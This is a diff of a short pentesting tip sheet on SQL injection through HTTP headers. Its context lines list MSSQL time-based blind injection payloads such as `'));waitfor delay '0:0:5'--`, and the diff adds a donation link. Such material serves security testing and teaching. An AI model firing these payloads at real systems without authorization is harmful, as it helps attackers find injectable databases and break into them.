@@ -3,7 +3,7 @@
 ### You should try Header Based SQLi's 👇
 
 🔴 What's that?
-Vuln. Allows Hackers to exploit SQL injections through HTTP headers being sent between the browser and server.
+This Vulnerability Allows Hackers to exploit SQL injections through HTTP headers being sent between the browser and server.
 
 🟡 But where to find it?
 Inject payloads inside of basic HTTP headers
@@ -52,3 +52,5 @@ Use my favorite payloads:
 * `));waitfor delay '0:0:5'--`
 * `'));waitfor delay '0:0:5'--`
 * `"));waitfor delay '0:0:5'--`
+
+[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/safisecu)
